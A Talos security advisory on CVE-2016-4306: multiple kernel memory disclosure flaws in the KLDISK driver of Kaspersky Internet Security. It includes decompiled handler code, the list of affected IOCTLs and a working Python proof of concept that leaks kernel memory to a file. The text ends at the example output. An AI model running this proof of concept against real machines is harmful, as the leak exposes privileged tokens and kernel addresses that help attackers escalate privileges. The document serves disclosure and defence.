# Talos Vulnerability Report

### TALOS-2016-0168

## Kaspersky Internet Security KLDISK Driver Multiple Kernel Memory Disclosure Vulnerabilities

##### August 26, 2016

##### CVE Number

CVE-2016-4306

### Summary

Multiple information leaks exist in various IOCTL handlers of the Kaspersky Internet Security KLDISK driver. Specially crafted IOCTL requests can cause the driver to return out of bounds kernel memory, potentially leaking sensitive information such as privileged tokens or kernel memory addresses that may be useful in bypassing kernel mitigations. An unprivileged user can run a program from user mode to trigger this vulnerability.

```
Because of used transfer type : METHOD_BUFFERED for in/out buffer and wrongly set value of output buffer len to IoStatus.Information
it leads to leak of kernel memory to userland.

```
### Tested Versions

Kaspersky Total Security 16.0.0.614

### Product URLs

http://www.kaspersky.com/

### Details

This vulnerability can be triggered by sending IOCTL requests to the KlDiskCtl device. Here we show the default access control on the device allow any user on the system to send IOCTL requests:

```
  accesschk.exe -q -o \Device\KlDiskCtl
  \Device\KlDiskCtl
    Type: Device
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators
    RW Everyone

```

Multiple privileged memory disclosure vulnerabilities exist specifically in the way certain IOCTL handlers misuse buffered transfers.
We can identify IOCTls using buffered transfers by looking for the METHOD\_BUFFERED property:

```
  WinIoCtlDecoder.py 0x8123e044

  Device   : <UNKNOWN> (0x8123)
  Function : 0x811
  Method   : METHOD_BUFFERED (0)
  Access   : FILE_READ_ACCESS | FILE_WRITE_ACCESS (3)

```

These vulnerabilities are strictly related with this specific transfer type and how the output buffer length information is set at the end of
the IOCTL handler function.

Analysis of an example vulnerable IOCTL handler at 0x8123e048 follows:

```
  1 	  if ( v7 == 0x8123E048 )
  2 	  {
  3 		ptrUserBuff = Irp->AssociatedIrp.SystemBuffer;
  4 		(...)
  5 		v33 = ioStackLocation->Parameters.DeviceIoControl.InputBufferLength;
  6 		v11 = v33 < 0x14;
  7 		OutputBufferLength = 0x14;
  8 		if ( v11 )
  9 		{
  10		  if ( v32 == &DeviceObject || !(v32->Characteristics & 1) || BYTE1(v32->Flags) < 2u )
  11			goto LABEL_120;
  12		  v77 = 0x14;
  13		  v74 = NewIrql;
  14		  v71 = &unk_92F411C0;
  15		  v68 = 56;
  16		  goto LABEL_265;
  17		}
  18		OutputBufferLength = ioStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
  19		*(ptrUserBuff + 2) = 0;
  20		*(ptrUserBuff + 1) = sub_92F403CA(ptrUserBuff_2, &OutputBufferLength);
  21	mem_leak_return:
  22		irp->IoStatus.Information = OutputBufferLength;
  23		return v13;
  24
  25
  26	(...)
  27
  28		signed int __stdcall sub_92F403CA(PBYTE inBuff, PDWORD outBuffLen)
  29		{
  30		  struct_v2 *v2; // edi@1
  31		  signed int v3; // esi@2
  32		  unsigned int v4; // eax@3
  33		  KIRQL v5; // bl@6
  34
  35		  v2 = checkOnList(*inBuff);
  36		  if ( v2 )
  37		  {
  38			  v4 = *(inBuff + 4);
  39			  if ( v4 > v2->dwordC4 || *outBuffLen < v4 + 0x14 )
  40			  {
  41			    v3 = 0xC000000D;
  42			  }
  43			  else
  44			  {
  45			    v5 = KfAcquireSpinLock(&v2->kspin_lock20A4);
  46			    memcpy(inBuff + 0x14, &v2->gap4[v2->dwordCC + 160], *(inBuff + 4));
  47			    KfReleaseSpinLock(&v2->kspin_lock20A4, v5);
  48			    v3 = 0;
  49			    *outBuffLen = *(inBuff + 4) + 20;
  50			  }
  51			  removeFromList(&v2->single_list_entry0);
  52		  }
  53		  else
  54		  {
  55			  v3 = 0xC0000225;
  56		  }
  57		  return v3;
  58		}

```

In Line 7 we see that OutputBufferLength is set to 0x14 but in Line 18 again assigned a value from parameters passed by user.
Line 20 makes a call to a function to which OutputBufferLength is passed as parameter and set by the underlying function based upon the return buffer size. The vulnerability appears when the condition on line 36 is not met. In this case, the function won’t assign outBuffLen on line 49.
Since the value is not replaced in the underlying function, on line 22 to IoStatus.Information field which indicates how many bytes is returned in output buffer to user mode is set based on fully controllable user input resulting in arbitrary amount of memory leaked from kernel to userspace.

The vulnerability exists during handling the following IOCTLs:

```
0x8123e048
0x8123e05c
0x8123e060

```
### Proof of Concept

Python code to trigger the memory disclosure:

```
  import win32file
  import win32con

  def leak_memory():
     fileName = u'\\\\.\\KlDiskCtl'
     hFile = win32file.CreateFileW(fileName,
                                  win32con.GENERIC_READ |win32con.GENERIC_WRITE,
                                  0,
                                  None,
                                  win32con.OPEN_EXISTING, 0 , None, 0)
     print "Handle ready : ",repr(hFile)

     ioctl = 0x8123e048
     inputBuffer = "A"*0x14
     inputBufferLen = len(inputBuffer)
     outBufferLen   = 0x1000

     print "Time to send IOCTL : 0x%x" % ioctl
     buf = win32file.DeviceIoControl(hFile, ioctl,inputBuffer,outBufferLen)
     buf = buf[inputBufferLen:]
     with file('outBuff.bin','wb') as f:
       f.write(buf)

  if __name__  == "__main__":
     leak_memory()

```

Example output:

```
  python ioctl.py
  Handle ready :  <PyHANDLE:112>
  Time to send IOCTL : 0x8123e048

  content of outBuff.bin
